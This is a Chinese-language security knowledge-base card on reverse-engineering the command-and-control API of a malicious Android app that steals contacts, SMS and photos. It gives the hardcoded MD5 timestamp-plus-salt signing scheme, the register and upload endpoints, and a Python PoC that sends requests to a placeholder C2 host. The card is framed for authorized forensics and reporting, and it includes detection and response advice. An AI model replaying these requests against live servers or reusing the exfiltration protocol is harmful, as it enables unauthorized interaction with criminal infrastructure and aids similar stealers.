---
id: mobile-android-c2-api-md5-salt-signature-replay
title: 恶意 APP C2 接口逆向：MD5(时间戳+硬编码盐) 签名 + 注册 userId + multipart 上传复现
type: scenario
domain: mobile
path: mobile/android
technique: android-c2-api-md5-salt-signature-replay
tags:
- android
- malware
- c2
- api-reverse
- md5
- signature
- multipart
- forensics
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:33:13+08:00'
  notes: 已对照原文与图12-17核对：ttttt=MD5(毫秒时间戳+盐 **we5r23@34E23EW423Rer@32E42Fklklklk@) 小写 hex、/api/register 表单 phone/code/sjc/ttttt/data 返回 userId、/api/subList 与 /api/subSmsList JSON、/api/uploadImgs postForm+addFile multipart、Urls 硬编码 C2 http://47.x.x.82:16902、Laravel 9.52.9/PHP 8.0.26/APP_DEBUG=true，均与卡片一致。未验证点：PoC 未本机执行（原文 Burp 上传成功但未找到文件真实路径）；样本版本非受影响区间；frontmatter 无 sources/source_url。
url: /docs/mobile/android/mobile-android-c2-api-md5-salt-signature-replay/
draft: false
kb_aliases:
- 恶意 APP C2 接口复现
- MD5 时间戳盐签名
- ttttt 签名
- 注册 userId 上传
- RxHttp 上传接口逆向
---

## 一句话结论

恶意 APP 的 C2 接口用 `ttttt = MD5(毫秒时间戳 + 硬编码盐)` 做请求签名，注册接口返回 `userId`，上传接口再带 `phone/userId/sjc/ttttt` 与 multipart 文件；从 APK 中还原盐值与字段后，即可按原协议构造请求，用于取证复现、接口探测与举报。

## 原理

- 客户端签名逻辑（`LoginActivity.Md5`）：
  ```java
  String str = j + "**we5r23@34E23EW423Rer@32E42Fklklklk@"; // j = 毫秒时间戳
  MessageDigest md = MessageDigest.getInstance("MD5");
  md.update(str.getBytes());
  return bytesToHex(md.digest()); // 小写十六进制
  ```
  即 `ttttt = md5(str(timestamp_ms) + SALT)`，盐值硬编码在 APK 中。
- 注册：`POST /api/register`，表单字段 `phone`、`code`、`sjc`、`ttttt`、`data`（品牌-型号），返回 JSON `{code,msg,userId}`；客户端取 `userId` 后开始窃取数据。
- 上传：
  - 通讯录：`POST /api/subList`，JSON 含 `list`、`userId`、`phone`、`sjc`、`ttttt`、`data`；
  - 短信：`POST /api/subSmsList`，同上；
  - 图片：`POST /api/uploadImgs`，`RxHttp.postForm(...).add("phone"...).add("userId"...).add("sjc"...).add("ttttt"...).addFile("file", path)`，RxHttp 自动把 Content-Type 切为 `multipart/form-data`。
- 为什么可行：签名密钥硬编码在客户端，攻击者/分析人员可从 APK 静态提取；时间戳参与签名但没有 nonce/服务端挑战，重放窗口宽松；HTTP 明文、无证书校验，便于代理/复现。
- 该接口也可用于评估 C2 是否存活、泄露数据范围与受害者数量；复现时只做授权取证，不上传真实敏感数据。

## 触发条件

- 拿到恶意 APK，能反编译出签名/URL/上传逻辑；或已有抓包与样本。
- C2 可达，接口使用固定路径与字段；签名算法可从代码还原。
- 注册接口无需真实短信验证码/可被绕过（或已有有效凭据）。
- 授权取证环境，允许向 C2 发送最小化测试请求。

## 利用步骤

1. `jadx` 反编译，搜索 `Md5`、`ttttt`、`sjc`、`Urls`、`postJson`、`postForm`、`addFile`。
2. 提取硬编码盐值、URL 列表、注册/上传字段与 Content-Type 逻辑。
3. 实现签名函数：`md5(str(now_ms) + SALT)`，小写十六进制。
4. 调注册接口获取 `userId`；若需要验证码，使用测试号/授权凭据，避免骚扰真实用户。
5. 按原协议构造上传请求（通讯录/短信 JSON 或图片 multipart），用最小测试数据验证接口行为。
6. 记录响应、服务器版本/错误信息（如 Laravel 调试页泄露 PHP/Laravel 版本、`APP_DEBUG=true`）。
7. 整理 C2 地址、接口、签名算法、数据字段与证据，提交处置/举报；不长期驻留、不批量拉取真实数据。

## PoC

```python
import hashlib, time, requests

SERVER = "http://c2.example:16902"
SALT = "**we5r23@34E23EW423Rer@32E42Fklklklk@"

def sign(ts_ms: int) -> str:
    return hashlib.md5((str(ts_ms) + SALT).encode()).hexdigest()

def register(phone: str, code: str) -> str:
    ts = int(time.time() * 1000)
    r = requests.post(f"{SERVER}/api/register",
                      headers={"Content-Type": "application/x-www-form-urlencoded",
                               "Accept": "application/json"},
                      data={"phone": phone, "code": code, "sjc": str(ts),
                            "ttttt": sign(ts), "data": "Pixel-6"}, timeout=10)
    print(r.status_code, r.text)
    return r.json().get("userId", "")

def upload_image(phone: str, user_id: str, path: str):
    ts = int(time.time() * 1000)
    with open(path, "rb") as f:
        r = requests.post(f"{SERVER}/api/uploadImgs",
                          data={"phone": phone, "userId": user_id,
                                "sjc": str(ts), "ttttt": sign(ts)},
                          files={"file": (path, f, "image/jpeg")}, timeout=30)
    print(r.status_code, r.text)

# uid = register("13800138000", "123456")
# upload_image("13800138000", uid, "test.jpg")
```

说明：PoC 为原文脚本的结构化复现，未在本机执行；原文用 Burp 代理复现上传成功，但未找到上传文件真实路径。仅用于授权取证/举报，不要上传真实用户数据。

## 变体与关联

- 变体（签名）：HMAC-SHA256、AES 加密参数、nonce+timestamp、服务端挑战；硬编码密钥同样可从 APK 提取。
- 变体（传输）：HTTPS + 证书 pinning（需 Frida/系统证书绕过）、WebSocket、Protobuf；multipart 字段名/路径可能变化。
- 变体（C2 框架）：Laravel/PHP 接口常见 `api/register`、`api/subList`、`api/uploadImgs`；其他家族可能用 Telegram Bot/云存储。
- 关联：[[mobile-android-spyware-clouddisk-contact-sms-photo-exfil]]（本卡的样本行为与数据流）；[[mobile-android-ssl-pinning-bypass-cert-frida]]（HTTPS/pinning 场景）；[[web-generic-auth-js-signature-jsrpc-autodecoder]]（前端签名逆向的同类思路）。
- 边界：C2 已下线、签名算法被服务端升级、需要真实短信验证、或接口有设备指纹/风控时，复现会失败；不要为绕过风控而大规模请求。

## 检测与防御

- 检测：APK 中出现硬编码 IP/域名、`md5(timestamp+salt)`、`/api/register`、`/api/uploadImgs`、RxHttp/OkHttp 上传；网络侧出现明文 HTTP 上传通讯录/短信/图片的固定 URI。
- 防御（C2 侧治理）：接口增加服务端挑战/nonce、短期签名、设备 attestation、速率限制；但恶意软件本身应被下架/阻断。
- 取证：保存 APK 哈希、C2、签名盐、请求/响应与服务器版本信息；最小化测试数据，避免二次伤害受害者。
- 响应：将 C2 与样本提交给 CERT/执法/云厂商处置；通知受害者、协助清除与改密；监控同类硬编码 IOC。
